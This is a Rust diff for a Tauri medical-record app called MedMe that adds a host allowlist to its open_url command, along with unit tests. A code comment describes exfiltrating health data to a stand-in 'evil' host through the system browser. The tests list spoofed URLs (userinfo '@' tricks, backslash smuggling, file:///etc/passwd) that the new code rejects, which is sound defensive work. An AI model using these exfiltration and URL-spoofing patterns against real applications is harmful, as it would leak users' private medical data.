@@ -45,7 +45,10 @@ fn lock<'a>(s: &'a State<'a, AppState>) -> Result<std::sync::MutexGuard<'a, Vaul
 /// because `&Vault` (rusqlite connection) isn't `UnwindSafe`; that's fine — on a
 /// caught panic we do not touch any half-mutated state, we just report the failure and
 /// the caller moves on to the next file.
-fn ingest_guarded(v: &Vault, path: &std::path::Path) -> Result<pipeline::IngestOutcome, String> {
+pub(crate) fn ingest_guarded(
+    v: &Vault,
+    path: &std::path::Path,
+) -> Result<pipeline::IngestOutcome, String> {
     match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| pipeline::ingest(v, path))) {
         Ok(Ok(o)) => Ok(o),
         Ok(Err(e)) => Err(e.to_string()),
@@ -495,6 +498,31 @@ pub fn open_path(app: tauri::AppHandle, path: String) -> Result<(), String> {
         .map_err(|e| e.to_string())
 }
 
+/// 「关于」页里仅有的两个合法外链目标:项目主页(github.io)与源码仓库(github.com)。
+/// 与前端 AboutView.tsx 的 HOMEPAGE_URL / REPO_URL 主机一一对应。
+const OPEN_URL_ALLOWED_HOSTS: [&str; 2] = ["lexuan-lin.github.io", "github.com"];
+
+/// 从一个 http(s) URL(应已转小写)里取出主机名(去掉 userinfo 与端口)。
+/// 在**最后一个** `@` 处切,使 `https://github.com@evil/` 解析出的是 `evil` 而非
+/// `github.com`;`\` 与 `/`、`?`、`#` 同样视作 authority 的结束,防止绕过。
+fn open_url_host(lower_url: &str) -> Option<String> {
+    let rest = lower_url
+        .strip_prefix("http://")
+        .or_else(|| lower_url.strip_prefix("https://"))?;
+    let authority_end = rest.find(['/', '\\', '?', '#']).unwrap_or(rest.len());
+    let authority = &rest[..authority_end];
+    let hostport = match authority.rfind('@') {
+        Some(i) => &authority[i + 1..],
+        None => authority,
+    };
+    let host = hostport.split(':').next().unwrap_or(hostport);
+    if host.is_empty() {
+        None
+    } else {
+        Some(host.to_string())
+    }
+}
+
 /// 在系统默认浏览器打开一个外部 URL(用于「关于」页的项目主页/源码链接)。
 #[tauri::command]
 pub fn open_url(app: tauri::AppHandle, url: String) -> Result<(), String> {
@@ -505,6 +533,14 @@ pub fn open_url(app: tauri::AppHandle, url: String) -> Result<(), String> {
     let scheme = u.to_ascii_lowercase();
     if !(scheme.starts_with("http://") || scheme.starts_with("https://")) {
         return Err("拒绝:只允许打开 http(s) 链接".to_string());
+    }
+    // SECURITY: scheme alone is not enough — without a host allowlist a compromised
+    // webview could `invoke('open_url', {url: 'https://evil/?d=<PHI>'})` and exfiltrate
+    // via the system browser (CSP-bypass). Restrict to the About page's two real
+    // destinations; reject everything else.
+    let host = open_url_host(&scheme).ok_or_else(|| "拒绝:无法解析链接域名".to_string())?;
+    if !OPEN_URL_ALLOWED_HOSTS.contains(&host.as_str()) {
+        return Err("拒绝:只允许打开 MedMe 项目主页或源码仓库链接".to_string());
     }
     app.opener()
         .open_url(u, None::<String>)
@@ -624,5 +660,40 @@ mod demo_data_tests {
                 "missing imaging file: {name}"
             );
         }
+    }
+}
+
+#[cfg(test)]
+mod open_url_tests {
+    use super::{open_url_host, OPEN_URL_ALLOWED_HOSTS};
+
+    /// Mirror `open_url`'s gate: lowercase, extract host, check the allowlist.
+    fn allowed(url: &str) -> bool {
+        let lower = url.to_ascii_lowercase();
+        match open_url_host(&lower) {
+            Some(h) => OPEN_URL_ALLOWED_HOSTS.contains(&h.as_str()),
+            None => false,
+        }
+    }
+
+    #[test]
+    fn allows_only_the_about_page_hosts() {
+        assert!(allowed(
+            "https://lexuan-lin.github.io/shadow_medical_record-/"
+        ));
+        assert!(allowed("https://github.com/Chesterguan/medme"));
+        assert!(allowed("HTTPS://GitHub.com/Chesterguan/medme")); // case-insensitive
+        assert!(allowed("https://github.com:443/x")); // port must not confuse host parse
+    }
+
+    #[test]
+    fn rejects_other_and_spoofed_hosts() {
+        assert!(!allowed("https://evil.com/?d=phi")); // exfil target
+        assert!(!allowed("https://evil.github.io/")); // different host, same suffix
+                                                      // userinfo spoof: authority `github.com@evil.com` → real host is evil.com.
+        assert!(!allowed("https://github.com@evil.com/"));
+        // backslash acts as a path separator, so it can't smuggle a trailing host.
+        assert!(!allowed("https://evil.com\\@github.com/"));
+        assert!(!allowed("file:///etc/passwd")); // non-http scheme has no allowed host
     }
 }
